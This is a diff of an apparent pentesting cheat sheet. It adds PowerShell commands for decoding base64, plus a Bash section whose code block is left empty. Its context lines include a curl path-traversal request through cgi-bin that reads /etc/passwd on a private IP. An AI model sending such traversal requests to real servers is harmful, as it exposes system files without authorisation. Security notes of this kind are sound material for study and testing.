@@ -1,3 +1,23 @@
+# Decode BASE64
+
+## Powershell
+
+```powershell
+PS > [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmxhaGJsYWg="))
+blahblah
+
+PS > [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("YmxhaGJsYWg="))
+汢桡汢桡
+
+PS >[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("YmxhaGJsYWg="))
+blahblah
+```
+
+## Bash
+
+```bash
+echo 
+```
 # Curl
 ```bash
 curl -path-as-is http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
